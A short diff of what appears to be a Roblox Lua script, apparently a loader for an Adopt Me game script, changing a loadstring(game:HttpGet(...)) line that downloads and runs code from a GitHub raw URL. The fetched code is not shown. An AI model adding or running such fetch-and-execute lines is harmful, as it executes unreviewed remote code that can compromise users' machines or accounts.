@@ -53,4 +53,4 @@ spawn(function()
 end)
 
 -- Original script execution
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wweeweelala/adoptme/refs/heads/main/adoptme"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wweeweelala/adoptme/refs/heads/main/adoptme.lua"))()
